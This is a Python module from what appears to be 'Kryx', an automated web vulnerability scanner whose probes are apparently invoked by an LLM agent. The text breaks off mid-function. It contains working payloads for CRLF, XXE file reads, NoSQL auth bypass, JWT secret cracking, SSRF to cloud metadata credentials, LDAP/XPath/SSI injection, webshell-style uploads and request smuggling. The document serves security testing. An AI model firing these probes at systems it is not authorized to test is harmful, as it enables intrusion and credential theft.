"""
Kryx extended probes — deterministic HTTP checks that widen attack coverage
beyond the core probe set. Each is a self-contained async function returning the
standard shape:  {"url", "vulnerable": bool, "findings": [...], "note": str}

These are tool-grounded (real requests, real evidence) so findings pass the
proof-by-execution bar. The hunter LLM only decides WHEN to call them.

Batch 1 — recon/header-level, low false-positive:
  headers_probe, crlf_probe, host_header_probe, hpp_probe, param_miner, cache_probe
"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.harness.auth_context import client as auth_client

MARKER = "kryx-oob.example"  # off-domain marker for reflection checks


def _norm(url: str) -> str:
    return url if url.startswith("http") else f"http://{url}"


def _with_params(url: str, overrides: dict) -> str:
    p = urlparse(url)
    qs = {k: v[0] for k, v in parse_qs(p.query, keep_blank_values=True).items()}
    qs.update(overrides)
    return urlunparse(p._replace(query=urlencode(qs)))


# ── Security headers + clickjacking + cookie flags ─────────────────────────
async def headers_probe(url: str) -> dict:
    """Audit response security headers (clickjacking, HSTS, CSP, MIME-sniffing)
    and cookie flags (HttpOnly/Secure/SameSite)."""
    url = _norm(url)
    findings = []
    async with auth_client(timeout=8, follow_redirects=True, verify=False) as c:
        try:
            r = await c.get(url)
        except Exception as e:
            return {"url": url, "vulnerable": False, "error": str(e)[:120]}
        h = {k.lower(): v for k, v in r.headers.items()}

        xfo = h.get("x-frame-options", "")
        csp = h.get("content-security-policy", "")
        if not xfo and "frame-ancestors" not in csp.lower():
            findings.append({"issue": "Clickjacking", "severity": "medium",
                             "proof": "No X-Frame-Options and no CSP frame-ancestors — page is framable."})
        if "content-security-policy" not in h:
            findings.append({"issue": "Missing CSP", "severity": "low",
                             "proof": "No Content-Security-Policy header."})
        if url.startswith("https") and "strict-transport-security" not in h:
            findings.append({"issue": "Missing HSTS", "severity": "low",
                             "proof": "HTTPS site without Strict-Transport-Security."})
        if h.get("x-content-type-options", "").lower() != "nosniff":
            findings.append({"issue": "MIME sniffing", "severity": "low",
                             "proof": "X-Content-Type-Options is not 'nosniff'."})

        # Cookie flags
        for cookie in r.headers.get_list("set-cookie") if hasattr(r.headers, "get_list") else \
                ([r.headers["set-cookie"]] if "set-cookie" in r.headers else []):
            low = cookie.lower()
            name = cookie.split("=", 1)[0]
            miss = [f for f in ("httponly", "secure", "samesite") if f not in low]
            if miss:
                findings.append({"issue": f"Weak cookie flags ({name})", "severity": "low",
                                 "proof": f"Cookie '{name}' missing: {', '.join(miss)}."})

    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
            "note": "Security-header / clickjacking / cookie-flag audit."}


# ── CRLF / HTTP response-header injection ──────────────────────────────────
async def crlf_probe(url: str) -> dict:
    """Inject CRLF into params to split the response and inject a header
    (Set-Cookie injection / open header injection)."""
    url = _norm(url)
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    if not qs:
        return {"url": url, "vulnerable": False, "note": "No query params to test for CRLF."}

    payloads = ["%0d%0aX-Kryx-Inj:1", "%0d%0aSet-Cookie:kryxcrlf=1", "\r\nX-Kryx-Inj:1"]
    findings = []
    async with auth_client(timeout=8, follow_redirects=False, verify=False) as c:
        for pname in qs:
            for pl in payloads:
                turl = _with_params(url, {pname: pl})
                try:
                    r = await c.get(turl)
                except Exception:
                    continue
                hl = {k.lower(): v for k, v in r.headers.items()}
                if "x-kryx-inj" in hl or "kryxcrlf" in r.headers.get("set-cookie", ""):
                    findings.append({"param": pname, "payload": pl,
                                     "proof": "Injected header reflected in response — CRLF injection."})
                    break
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
            "note": "CRLF / HTTP response header injection."}


# ── Host header injection (password-reset poisoning / routing) ─────────────
async def host_header_probe(url: str) -> dict:
    """Send a spoofed Host / X-Forwarded-Host and check if it is reflected in
    the body or in a redirect Location (password-reset poisoning, cache vector)."""
    url = _norm(url)
    findings = []
    spoof = MARKER
    async with auth_client(timeout=8, follow_redirects=False, verify=False) as c:
        for hdr in ("Host", "X-Forwarded-Host", "X-Host", "X-Forwarded-Server"):
            try:
                r = await c.get(url, headers={hdr: spoof})
            except Exception:
                continue
            loc = r.headers.get("location", "")
            body = r.text[:5000] if r.text else ""
            if spoof in loc or spoof in body:
                where = "Location" if spoof in loc else "body"
                findings.append({"header": hdr, "proof": f"Spoofed host reflected in {where}: {spoof}"})
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
            "note": "Host-header injection (reset-link poisoning / routing abuse)."}


# ── HTTP Parameter Pollution ───────────────────────────────────────────────
async def hpp_probe(url: str) -> dict:
    """Send a duplicated parameter and report when the response differs from the
    single-value baseline (parameter pollution → filter/logic bypass surface)."""
    url = _norm(url)
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    if not qs:
        return {"url": url, "vulnerable": False, "note": "No query params to test for HPP."}
    findings = []
    async with auth_client(timeout=8, follow_redirects=True, verify=False) as c:
        try:
            base = await c.get(url)
        except Exception as e:
            return {"url": url, "vulnerable": False, "error": str(e)[:120]}
        for pname in qs:
            polluted = url + ("&" if "?" in url else "?") + f"{pname}=kryx2"
            try:
                r = await c.get(polluted)
            except Exception:
                continue
            if r.status_code != base.status_code or abs(len(r.text) - len(base.text)) > 40:
                findings.append({"param": pname,
                                 "proof": f"Duplicated '{pname}' changes response "
                                          f"(status {base.status_code}->{r.status_code}, "
                                          f"len {len(base.text)}->{len(r.text)})."})
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
            "note": "HTTP Parameter Pollution — duplicated params alter behavior."}


# ── Hidden parameter discovery ─────────────────────────────────────────────
_COMMON_PARAMS = [
    "debug", "test", "admin", "id", "user", "page", "file", "path", "url",
    "redirect", "next", "callback", "format", "view", "action", "cmd", "exec",
    "include", "template", "lang", "key", "token", "api_key", "preview", "source",
]


async def param_miner(url: str) -> dict:
    """Probe a wordlist of common hidden parameters; flag those that change the
    response vs baseline (likely a real, undocumented input to attack)."""
    url = _norm(url)
    async with auth_client(timeout=8, follow_redirects=True, verify=False) as c:
        try:
            base = await c.get(url)
        except Exception as e:
            return {"url": url, "vulnerable": False, "error": str(e)[:120]}
        base_len = len(base.text)
        hits = []
        for pname in _COMMON_PARAMS:
            try:
                r = await c.get(_with_params(url, {pname: "kryx1"}))
            except Exception:
                continue
            if r.status_code != base.status_code or abs(len(r.text) - base_len) > 60:
                hits.append({"param": pname,
                             "proof": f"'{pname}' alters response (status {base.status_code}->{r.status_code}, "
                                      f"len {base_len}->{len(r.text)})."})
    return {"url": url, "vulnerable": len(hits) > 0, "findings": hits,
            "note": "Hidden-parameter discovery — undocumented inputs worth attacking."}


# ── Web cache poisoning / deception surface ────────────────────────────────
async def cache_probe(url: str) -> dict:
    """Check for an unkeyed header reflected into a cacheable response (cache
    poisoning) and path-confusion cacheability (cache deception)."""
    url = _norm(url)
    findings = []
    async with auth_client(timeout=8, follow_redirects=True, verify=False) as c:
        # Cache poisoning: unkeyed X-Forwarded-Host reflected into a cacheable response.
        try:
            r = await c.get(url, headers={"X-Forwarded-Host": MARKER})
            cc = r.headers.get("cache-control", "").lower()
            cacheable = "no-store" not in cc and "private" not in cc
            if MARKER in (r.text[:8000] or "") and cacheable:
                findings.append({"issue": "Cache poisoning",
                                 "proof": f"Unkeyed X-Forwarded-Host reflected into a cacheable response ({cc or 'no cache-control'})."})
        except Exception:
            pass
        # Cache deception: append a static-looking suffix; if it still returns the
        # dynamic page AND is cacheable, a shared cache may store private content.
        try:
            decep = url.rstrip("/") + "/kryx.css"
            r2 = await c.get(decep)
            if r2.status_code == 200 and "text/html" in r2.headers.get("content-type", ""):
                findings.append({"issue": "Cache deception",
                                 "proof": f"{decep} returns HTML (200) — static-suffix path served dynamic content."})
        except Exception:
            pass
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
            "note": "Web cache poisoning / deception surface."}


# ════════════════════════════════════════════════════════════════════════════
# Batch 2 — RCE-tier / high-impact classes
#   xxe_probe, nosql_probe, jwt_probe, graphql_probe,
#   deserialization_probe, prototype_pollution_probe, upload_probe
# ════════════════════════════════════════════════════════════════════════════
import base64
import hashlib
import hmac
import json as _json
import re


# ── XXE (XML External Entity) ──────────────────────────────────────────────
async def xxe_probe(url: str) -> dict:
    """POST an XML body with an external entity that reads a local file; if the
    file content (e.g. root:) reflects back, XXE is confirmed."""
    url = _norm(url)
    payloads = [
        # classic file read
        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
         '<r>&xxe;</r>', "root:"),
        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
         '<r>&xxe;</r>', "[fonts]"),
    ]
    findings = []
    async with auth_client(timeout=10, follow_redirects=True, verify=False) as c:
        for body, marker in payloads:
            for ct in ("application/xml", "text/xml"):
                try:
                    r = await c.post(url, content=body, headers={"Content-Type": ct})
                except Exception:
                    continue
                if marker in (r.text or ""):
                    findings.append({"content_type": ct,
                                     "proof": f"External entity expanded — '{marker}' leaked into response (XXE → file read)."})
                    return {"url": url, "vulnerable": True, "findings": findings,
                            "note": "XXE confirmed: server parsed external entity and returned local file content."}
    return {"url": url, "vulnerable": False, "findings": findings,
            "note": "XXE: endpoint did not reflect injected external entity (may not accept XML)."}


# ── NoSQL Injection ────────────────────────────────────────────────────────
async def nosql_probe(url: str) -> dict:
    """Inject MongoDB-style operators into params and a JSON login body; flag
    auth-bypass / response divergence / operator errors."""
    url = _norm(url)
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    findings = []
    async with auth_client(timeout=8, follow_redirects=True, verify=False) as c:
        # GET param operator injection: ?user[$ne]=x
        try:
            base = await c.get(url)
            base_len = len(base.text)
        except Exception as e:
            base, base_len = None, 0
        for pname in qs:
            inj = url + ("&" if "?" in url else "?") + f"{pname}[$ne]=kryx"
            try:
                r = await c.get(inj)
            except Exception:
                continue
            blob = (r.text or "").lower()
            if any(s in blob for s in ("mongo", "bson", "$ne", "casterror", "e11000")):
                findings.append({"param": pname, "proof": "Mongo/NoSQL error surfaced on operator injection."})
            elif base is not None and abs(len(r.text) - base_len) > 80 and r.status_code == 200:
                findings.append({"param": pname, "proof": f"[$ne] operator changes response (len {base_len}->{len(r.text)}) — possible NoSQLi."})
        # JSON body auth-bypass attempt
        for payload in ({"username": {"$ne": None}, "password": {"$ne": None}},
                        {"user": {"$gt": ""}, "pass": {"$gt": ""}}):
            try:
                r = await c.post(url, json=payload)
            except Exception:
                continue
            blob = (r.text or "").lower()
            if r.status_code in (200, 302) and any(s in blob for s in ("token", "welcome", "dashboard", "success", "logout")):
                findings.append({"payload": payload, "proof": f"NoSQL operator JSON body returns authenticated-looking response ({r.status_code})."})
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
            "note": "NoSQL injection (Mongo operator) — auth bypass / query tampering."}


# ── JWT weaknesses ─────────────────────────────────────────────────────────
_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
_JWT_SECRETS = ["secret", "password", "123456", "key", "jwt", "admin", "changeme",
                "secretkey", "token", "private", "s3cr3t", "supersecret", "your-256-bit-secret"]


def _b64url_dec(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


async def jwt_probe(url: str, token: str = None) -> dict:
    """Find a JWT (arg, cookie, or response) and test for: alg=none acceptance,
    weak HMAC secret (dictionary), and header/payload disclosure."""
    url = _norm(url)
    findings = []
    if not token:
        async with auth_client(timeout=8, follow_redirects=True, verify=False) as c:
            try:
                r = await c.get(url)
                blob = (r.text or "") + " " + " ".join(f"{k}:{v}" for k, v in r.headers.items())
                m = _JWT_RE.search(blob)
                if m:
                    token = m.group()
            except Exception:
                pass
    if not token:
        return {"url": url, "vulnerable": False, "note": "No JWT found to analyse (pass token= to test one)."}

    try:
        h_b64, p_b64, sig = token.split(".")
        header = _json.loads(_b64url_dec(h_b64))
        payload = _json.loads(_b64url_dec(p_b64))
    except Exception:
        return {"url": url, "vulnerable": False, "note": "Found a token but it is not a decodable JWT."}

    findings.append({"info": "JWT decoded", "alg": header.get("alg"),
                     "claims": list(payload.keys())})
    if str(header.get("alg", "")).lower() == "none":
        findings.append({"issue": "alg=none", "severity": "critical",
                         "proof": "Token uses alg=none — signature not verified, trivially forgeable."})
    # Weak HMAC secret crack
    if str(header.get("alg", "")).upper().startswith("HS"):
        signing_input = f"{h_b64}.{p_b64}".encode()
        algo = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(
            header.get("alg", "HS256").upper(), hashlib.sha256)
        for secret in _JWT_SECRETS:
            calc = base64.urlsafe_b64encode(hmac.new(secret.encode(), signing_input, algo).digest()).rstrip(b"=").decode()
            if calc == sig:
                findings.append({"issue": "weak HMAC secret", "severity": "critical",
                                 "proof": f"JWT signed with weak secret '{secret}' — full token forgery possible."})
                break
    has_issue = any(f.get("severity") for f in findings)
    return {"url": url, "vulnerable": has_issue, "findings": findings,
            "note": "JWT analysis: alg confusion / weak secret / claim disclosure."}


# ── GraphQL introspection + surface ────────────────────────────────────────
async def graphql_probe(url: str) -> dict:
    """Locate a GraphQL endpoint and test whether introspection is enabled
    (full schema disclosure → attack map)."""
    url = _norm(url)
    base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    paths = ["/graphql", "/api/graphql", "/v1/graphql", "/graphql/console", "/query", url]
    q = {"query": "query{__schema{types{name fields{name}}}}"}
    findings = []
    async with auth_client(timeout=8, follow_redirects=True, verify=False) as c:
        seen = set()
        for path in paths:
            ep = path if path.startswith("http") else base + path
            if ep in seen:
                continue
            seen.add(ep)
            try:
                r = await c.post(ep, json=q)
            except Exception:
                continue
            if "__schema" in (r.text or "") and r.status_code == 200:
                types = re.findall(r'"name":"(\w+)"', r.text)
                findings.append({"endpoint": ep, "severity": "medium",
                                 "proof": f"GraphQL introspection ENABLED — schema disclosed ({len(set(types))} types). Attack surface fully mapped."})
                break
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
            "note": "GraphQL introspection / endpoint discovery."}


# ── Insecure deserialization (detection) ───────────────────────────────────
_DESER_SIGS = [
    ("Java", re.compile(r"rO0AB|aced0005")),
    ("PHP", re.compile(r"\b[OaC]:\d+:")),
    ("Python pickle", re.compile(r"\x80\x04|gASV|gAJ")),
    (".NET ViewState", re.compile(r"__VIEWSTATE|/wEP")),
    ("Ruby Marshal", re.compile(r"\x04\x08")),
]


async def deserialization_probe(url: str) -> dict:
    """Detect serialized objects in cookies/params/response — a strong indicator
    of an insecure-deserialization sink (RCE-tier if a gadget chain exists)."""
    url = _norm(url)
    findings = []
    async with auth_client(timeout=8, follow_redirects=True, verify=False) as c:
        try:
            r = await c.get(url)
        except Exception as e:
            return {"url": url, "vulnerable": False, "error": str(e)[:120]}
        haystacks = {"response body": r.text or "",
                     "cookies": " ".join(f"{k}={v}" for k, v in r.cookies.items()),
                     "url": url}
        for where, blob in haystacks.items():
            for lang, rx in _DESER_SIGS:
                if rx.search(blob):
                    findings.append({"location": where, "format": lang, "severity": "high",
                                     "proof": f"{lang} serialized object detected in {where} — test for insecure deserialization (gadget → RCE)."})
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
            "note": "Insecure-deserialization indicator (serialized blob present)."}


# ── Prototype pollution ────────────────────────────────────────────────────
async def prototype_pollution_probe(url: str) -> dict:
    """Test client/server prototype pollution via __proto__ in query and JSON
    body; flag reflection of the polluted property or a 500 from pollution."""
    url = _norm(url)
    findings = []
    async with auth_client(timeout=8, follow_redirects=True, verify=False) as c:
        # query-string vector
        try:
            r = await c.get(_with_params(url, {"__proto__[kryxpp]": "polluted"}))
            if "kryxpp" in (r.text or "") or r.status_code >= 500:
                findings.append({"vector": "query __proto__", "severity": "high",
                                 "proof": f"__proto__ query param reflected/errored (status {r.status_code}) — prototype pollution."})
        except Exception:
            pass
        # JSON body vector
        try:
            r = await c.post(url, json={"__proto__": {"kryxpp": "polluted"}})
            if "kryxpp" in (r.text or "") or r.status_code >= 500:
                findings.append({"vector": "JSON __proto__", "severity": "high",
                                 "proof": f"JSON __proto__ body reflected/errored (status {r.status_code}) — prototype pollution."})
        except Exception:
            pass
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
            "note": "Prototype pollution (__proto__) — can escalate to RCE/auth bypass in JS apps."}


# ── Insecure file upload (best-effort detection) ───────────────────────────
async def upload_probe(url: str) -> dict:
    """Attempt a benign multipart upload with a dangerous double extension and
    content-type, and report if it is accepted (weak validation → webshell)."""
    url = _norm(url)
    findings = []
    files = {"file": ("kryx.php.jpg", b"GIF89a;<?php echo 'kryx-marker'; ?>", "image/jpeg")}
    async with auth_client(timeout=10, follow_redirects=True, verify=False) as c:
        try:
            r = await c.post(url, files=files)
        except Exception as e:
            return {"url": url, "vulnerable": False, "error": str(e)[:120]}
        blob = (r.text or "").lower()
        if r.status_code in (200, 201) and any(s in blob for s in ("upload", "success", "kryx.php", "/uploads/", "file")):
            findings.append({"severity": "high",
                             "proof": f"Server accepted 'kryx.php.jpg' multipart upload ({r.status_code}) — verify executable upload path (webshell risk)."})
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
            "note": "Insecure file upload (double-extension / content-type bypass)."}


# ════════════════════════════════════════════════════════════════════════════
# Batch 3 — cloud, exotic injections, CSRF, websockets, smuggling, mgmt panels
#   cloud_metadata_probe, ldap_probe, xpath_probe, ssi_probe, csrf_probe,
#   websocket_probe, smuggling_probe, open_mgmt_probe
# ════════════════════════════════════════════════════════════════════════════
import asyncio as _asyncio
import time as _time


# ── SSRF → cloud metadata → credentials ────────────────────────────────────
_META_TARGETS = [
    ("AWS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", {}, ("ami-id", "iam", "AccessKeyId", "instance-id")),
    ("GCP", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
     {"Metadata-Flavor": "Google"}, ("access_token", "computeMetadata", "service-accounts")),
    ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     {"Metadata": "true"}, ("compute", "azEnvironment", "subscriptionId")),
]


async def cloud_metadata_probe(url: str) -> dict:
    """Pivot an SSRF-style parameter to the cloud metadata endpoint and look for
    leaked instance credentials (AWS/GCP/Azure). RCE-tier: metadata creds = cloud
    account takeover."""
    url = _norm(url)
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    ssrf_params = [k for k in qs if any(s in k.lower() for s in
                  ("url", "uri", "path", "dest", "redirect", "next", "target", "host", "site", "proxy", "fetch", "callback", "img", "image", "load", "domain", "feed", "u"))]
    findings = []
    async with auth_client(timeout=10, follow_redirects=True, verify=False) as c:
        for pname in (ssrf_params or list(qs)):
            for cloud, meta_url, hdrs, markers in _META_TARGETS:
                try:
                    r = await c.get(_with_params(url, {pname: meta_url}), headers=hdrs)
                except Exception:
                    continue
                if any(m in (r.text or "") for m in markers):
                    findings.append({"param": pname, "cloud": cloud, "severity": "critical",
                                     "proof": f"SSRF via '{pname}' reached {cloud} metadata — instance credentials exposed ({meta_url})."})
                    return {"url": url, "vulnerable": True, "findings": findings,
                            "note": "SSRF → cloud metadata → credentials (cloud account takeover)."}
    return {"url": url, "vulnerable": False, "findings": findings,
            "note": "No SSRF param reached cloud metadata."}


# ── LDAP Injection ─────────────────────────────────────────────────────────
async def ldap_probe(url: str) -> dict:
    url = _norm(url)
    qs = parse_qs(urlparse(url).query, keep_blank_values=True)
    if not qs:
        return {"url": url, "vulnerable": False, "note": "No params to test for LDAP injection."}
    payloads = ["*", "*)(uid=*))(|(uid=*", "admin)(&)", "*)(objectClass=*"]
    errs = ("ldap", "invalid dn syntax", "javax.naming", "com.sun.jndi", "bad search filter")
    findings = []
    async with auth_client(timeout=8, follow_redirects=True, verify=False) as c:
        try:
            base = await c.get(url); base_len = len(base.text)
        except Exception as e:
            return {"url": url, "vulnerable": False, "error": str(e)[:120]}
        for pname in qs:
            for pl in payloads:
                try:
                    r = await c.get(_with_params(url, {pname: pl}))
                except Exception:
                    continue
                low = (r.text or "").lower()
                if any(e in low for e in errs):
                    findings.append({"param": pname, "payload": pl, "proof": "LDAP error surfaced — LDAP injection."}); break
                if abs(len(r.text) - base_len) > 100 and r.status_code == 200:
                    findings.append({"param": pname, "payload": pl, "proof": f"Wildcard alters response (len {base_len}->{len(r.text)}) — possible LDAP injection."}); break
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings, "note": "LDAP injection."}


# ── XPATH Injection ────────────────────────────────────────────────────────
async def xpath_probe(url: str) -> dict:
    url = _norm(url)
    qs = parse_qs(urlparse(url).query, keep_blank_values=True)
    if not qs:
        return {"url": url, "vulnerable": False, "note": "No params to test for XPath injection."}
    payloads = ["' or '1'='1", "'] | //* | ['", "count(/*)", "'"]
    errs = ("xpath", "xpathexception", "simplexmlelement", "xmlxpath", "unfinished literal")
    findings = []
    async with auth_client(timeout=8, follow_redirects=True, verify=False) as c:
        try:
            base = await c.get(url); base_len = len(base.text)
        except Exception as e:
            return {"url": url, "vulnerable": False, "error": str(e)[:120]}
        for pname in qs:
            for pl in payloads:
                try:
                    r = await c.get(_with_params(url, {pname: pl}))
                except Exception:
                    continue
                low = (r.text or "").lower()
                if any(e in low for e in errs):
                    findings.append({"param": pname, "payload": pl, "proof": "XPath error surfaced — XPath injection."}); break
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings, "note": "XPath injection."}


# ── Server-Side Includes (SSI) Injection ───────────────────────────────────
async def ssi_probe(url: str) -> dict:
    url = _norm(url)
    qs = parse_qs(urlparse(url).query, keep_blank_values=True)
    if not qs:
        return {"url": url, "vulnerable": False, "note": "No params to test for SSI."}
    findings = []
    async with auth_client(timeout=8, follow_redirects=True, verify=False) as c:
        for pname in qs:
            # echo a known var, then attempt command exec
            try:
                r = await c.get(_with_params(url, {pname: '<!--#exec cmd="echo kryx-ssi-12345"-->'}))
            except Exception:
                continue
            if "kryx-ssi-12345" in (r.text or "") and "<!--#exec" not in (r.text or ""):
                findings.append({"param": pname, "severity": "critical",
                                 "proof": "SSI directive executed (#exec) — server-side includes injection → RCE."}); break
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings, "note": "Server-Side Includes injection."}


# ── CSRF (missing-token detection) ─────────────────────────────────────────
async def csrf_probe(url: str) -> dict:
    """Detect state-changing forms lacking an anti-CSRF token and cookies without
    SameSite (CSRF surface)."""
    url = _norm(url)
    findings = []
    async with auth_client(timeout=8, follow_redirects=True, verify=False) as c:
        try:
            r = await c.get(url)
        except Exception as e:
            return {"url": url, "vulnerable": False, "error": str(e)[:120]}
        html = r.text or ""
        forms = re.findall(r"<form[^>]*>(.*?)</form>", html, re.I | re.S)
        token_kw = ("csrf", "_token", "authenticity_token", "xsrf", "nonce", "__requestverificationtoken")
        for fbody in forms:
            method_post = re.search(r"<form[^>]*method=[\"']?post", html, re.I)
            if method_post and not any(k in fbody.lower() for k in token_kw):
                findings.append({"severity": "medium",
                                 "proof": "POST form without an anti-CSRF token field."}); break
        # SameSite on cookies
        for ck in (r.headers.get_list("set-cookie") if hasattr(r.headers, "get_list") else []):
            if "samesite" not in ck.lower():
                findings.append({"severity": "low", "proof": f"Cookie '{ck.split('=')[0]}' has no SameSite — cross-site sendable."}); break
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings, "note": "CSRF surface (missing token / SameSite)."}


# ── WebSocket: discovery + Cross-Site WebSocket Hijacking ──────────────────
async def websocket_probe(url: str) -> dict:
    """Find WebSocket endpoints in the page and test Origin validation
    (CSWSH — a handshake accepted with a foreign Origin)."""
    url = _norm(url)
    findings = []
    async with auth_client(timeout=8, follow_redirects=True, verify=False) as c:
        try:
            r = await c.get(url)
        except Exception as e:
            return {"url": url, "vulnerable": False, "error": str(e)[:120]}
        ws_eps = set(re.findall(r"wss?://[A-Za-z0-9_.:/\-]+", r.text or ""))
    if not ws_eps:
        return {"url": url, "vulnerable": False, "note": "No WebSocket endpoints found in page."}
    try:
        import websockets
    except Exception:
        return {"url": url, "vulnerable": False, "findings": [{"endpoints": list(ws_eps)}],
                "note": "WebSocket endpoints found (websockets lib unavailable for CSWSH test)."}
    for ep in list(ws_eps)[:3]:
        try:
            async with websockets.connect(ep, origin="https://kryx-evil.example", open_timeout=6) as ws:
                findings.append({"endpoint": ep, "severity": "high",
                                 "proof": "WebSocket handshake accepted with foreign Origin — Cross-Site WebSocket Hijacking."})
        except Exception:
            continue
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings or [{"endpoints": list(ws_eps)}],
            "note": "WebSocket discovery + CSWSH (Origin validation)."}


# ── HTTP Request Smuggling (conservative CL.TE timing) ─────────────────────
async def smuggling_probe(url: str) -> dict:
    """Conservative CL.TE desync check: a smuggling-vulnerable front-end times out
    waiting for a body the back-end already consumed. Flagged as POTENTIAL —
    request smuggling needs manual confirmation."""
    p = urlparse(_norm(url))
    host = p.hostname
    port = p.port or (443 if p.scheme == "https" else 80)
    if not host:
        return {"url": url, "vulnerable": False, "note": "Bad URL for smuggling test."}
    path = p.path or "/"
    # CL.TE: body says 1 chunk-terminator; CL=4 so front-end forwards "0\r\n\r\n".
    smuggle = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
               f"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n")
    async def _timed(req: str) -> float:
        t = _time.monotonic()
        try:
            if p.scheme == "https":
                import ssl as _ssl
                ctx = _ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = _ssl.CERT_NONE
                reader, writer = await _asyncio.wait_for(_asyncio.open_connection(host, port, ssl=ctx), timeout=8)
            else:
                reader, writer = await _asyncio.wait_for(_asyncio.open_connection(host, port), timeout=8)
            writer.write(req.encode()); await writer.drain()
            try:
                await _asyncio.wait_for(reader.read(200), timeout=6)
            except _asyncio.TimeoutError:
                return 6.0
            finally:
                writer.close()
        except Exception:
            return -1.0
        return _time.monotonic() - t
    base = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\n\r\n")
    tb = await _timed(base)
    ts = await _timed(smuggle)
    findings = []
    if tb >= 0 and ts >= 5 and ts - tb > 4:
        findings.append({"severity": "high", "confidence": "potential",
                         "proof": f"CL.TE request delayed back-end ({ts:.1f}s vs {tb:.1f}s baseline) — POTENTIAL HTTP request smuggling, verify manually."})
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
            "note": "HTTP request smuggling (CL.TE timing, conservative)."}


# ── Exposed management / debug interfaces ──────────────────────────────────
_MGMT_PATHS = [
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/heapdump",
    "/manager/html", "/server-status", "/metrics", "/debug/vars", "/swagger-ui/",
    "/api-docs", "/openapi.json", "/.git/HEAD", "/phpmyadmin/", "/adminer.php",
    "/jenkins/", "/grafana/login", "/kibana/", "/wp-admin/", "/console", "/jolokia",
]
_MGMT_MARKERS = ("actuator", "swagger", "openapi", "phpmyadmin", "jenkins",
                 "grafana", "kibana", "tomcat", "prometheus", "ref:", "heapdump")


async def open_mgmt_probe(url: str) -> dict:
    """Probe a curated list of exposed admin/debug/management panels (Spring
    actuator, Tomcat manager, swagger, phpMyAdmin, Jenkins, Grafana, …)."""
    base = f"{urlparse(_norm(url)).scheme}://{urlparse(_norm(url)).netloc}"
    findings = []
    async with auth_client(timeout=7, follow_redirects=True, verify=False) as c:
        for path in _MGMT_PATHS:
            try:
                r = await c.get(base + path)
            except Exception:
                continue
            low = (r.text or "")[:4000].lower()
            if r.status_code == 200 and any(m in low for m in _MGMT_MARKERS):
                sev = "high" if any(x in path for x in ("actuator/env", "heapdump", ".git", "jolokia", "manager")) else "medium"
                findings.append({"path": path, "severity": sev,
                                 "proof": f"Exposed management/debug interface at {path} (HTTP 200)."})
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
            "note": "Exposed management/debug interfaces."}


# ════════════════════════════════════════════════════════════════════════════
# Batch 4 — resource exhaustion / unbounded input (NON-DESTRUCTIVE by default)
# ════════════════════════════════════════════════════════════════════════════
import os as _os


async def resource_probe(url: str, method: str = "POST") -> dict:
    """Detect resource-exhaustion / unbounded-input DoS surface on a write
    endpoint WITHOUT taking the target down.

    Safety model (non-destructive by default — this is a SaaS pointed at client
    prod): sends only a few BOUNDED, escalating payloads (≤512KB, ≤4 requests,
    sequential, early-stop), never floods. It looks for:
      • a missing request-size limit (no 413 Payload Too Large),
      • degradation (latency spike / 5xx / timeout) as size grows,
      • state-change-despite-error (resource seemingly created on an error).
    Aggressive sizes (up to KRYX_RESOURCE_MAX_KB) require the explicit consent
    flag KRYX_RESOURCE_AGGRESSIVE=1. Findings are flagged "potential" for manual
    confirmation — we never actually exhaust the target.
    """
    url = _norm(url)
    method = (method or "POST").upper()
    aggressive = _os.getenv("KRYX_RESOURCE_AGGRESSIVE") == "1"
    default_cap = 8192 if aggressive else 512  # KB
    max_kb = int(_os.getenv("KRYX_RESOURCE_MAX_KB", str(default_cap)))
    sizes_kb = [s for s in (1, 64, 256, 512, 2048, 8192) if s <= max_kb][:4]
    if not sizes_kb:
        sizes_kb = [min(64, max_kb)]

    findings = []
    async with auth_client(timeout=15, follow_redirects=False, verify=False) as c:
        try:
            t0 = _time.monotonic()
            base = await c.request(method, url, content=b"x")
            base_ms = (_time.monotonic() - t0) * 1000
            base_status = base.status_code
        except Exception as e:
            return {"url": url, "vulnerable": False, "error": str(e)[:120]}

        limit_enforced = False
        largest_ok = 0
        for kb in sizes_kb:
            payload = b"A" * (kb * 1024)
            try:
                t0 = _time.monotonic()
                r = await c.request(method, url, content=payload,
                                    headers={"Content-Type": "application/octet-stream"})
                dt = (_time.monotonic() - t0) * 1000
            except Exception:
